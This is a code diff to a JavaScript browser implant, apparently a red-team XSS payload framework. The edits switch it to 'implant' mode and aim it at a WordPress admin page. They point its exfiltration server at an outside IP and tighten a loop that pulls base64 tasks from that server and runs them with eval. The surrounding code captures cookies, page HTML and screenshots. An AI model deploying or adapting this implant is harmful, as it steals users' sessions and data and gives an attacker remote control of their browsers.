@@ -33,7 +33,7 @@ var r=function(A,e){return(r=Object.setPrototypeOf||{__proto__:[]}instanceof Arr
 // EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 // MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 // IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
-// OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
+// OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORTn OR OTHERWISE,
 // ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 // OTHER DEALINGS IN THE SOFTWARE.
 
@@ -57,10 +57,11 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "trap";
+	window.taperMode = "implant";
 
 	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
+//	window.taperexfilServer = "https://127.0.0.1:8444";
+	window.taperexfilServer = "https://100.115.92.203:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -86,8 +87,8 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-		window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+		//window.taperstartingPage = "https://127.0.0.1:8443/";
 	}
 	else // if implant mode
 	{
@@ -102,10 +103,18 @@ function initGlobals()
 		});
 	}
 
+	// test
+		window.addEventListener("beforeunload", function()
+		{
+			console.log("**** Unloading page, removing payload loaded flag...");
+			sessionStorage.removeItem("taperSystemLoaded");
+		});
+
+
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "";
+	window.taperTag = "wp1";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -113,7 +122,7 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = true;
+	window.monkeyPatchAPIs = false;
 
 
 	// Should we capture a screenshot after a delay after an API call?
@@ -126,7 +135,9 @@ function initGlobals()
 
 	// Should we check for tasks? How often?
 	window.taperTaskCheck      = true;
-	window.taperTaskCheckDelay = 5000;
+	window.taperTaskCheckDelay = 1000;
+	window.taperTaskIntervalID = "";
+
 
 	// Helpful variables
 	if (!sessionStorage.hasOwnProperty('taperLastUrl'))
@@ -165,6 +176,17 @@ function initGlobals()
 
 
 
+function updateTaskCheckInterval(newDelay)
+{
+    if (window.taperTaskIntervalID) {
+        clearInterval(window.taperTaskIntervalID);
+    }
+    
+    window.taperTaskIntervalID = setInterval(checkTasks, newDelay);
+    
+    window.taperTaskCheckDelay = newDelay;
+}
+
 
 
 function canAccessIframe(iframe) {
@@ -199,7 +221,7 @@ function sendScreenshot()
 		{
 			myReference = document;
 		}
-		console.log("In screenshot, myreference is set");
+		// console.log("In screenshot, myreference is set");
 		// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 		html2canvas(myReference.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 		{
@@ -324,7 +346,7 @@ function checkCookies()
 
 			if (cookieName in cookieDict)
 			{
-				console.log("== Existing cookie: " + cookieName);
+				// console.log("== Existing cookie: " + cookieName);
 				if (cookieDict[cookieName] != cookieValue)
 				{
 					// Existing cookie, but the value has changed
@@ -966,7 +988,7 @@ async function checkTasks()
 		var taskId   = jsonResponse[i].id;
 		var taskData = jsonResponse[i].data;
 
-		console.log("Got task: " + taskData);
+		// console.log("Got task: " + taskData);
 
 		eval(atob(taskData));
 	}
@@ -1049,7 +1071,7 @@ function takeOver()
 	// And don't forget tasks
 	if (window.taperTaskCheck)
 	{
-		setInterval(checkTasks, window.taperTaskCheckDelay);
+		window.taperTaskIntervalID = setInterval(checkTasks, window.taperTaskCheckDelay);
 	}
 }
 
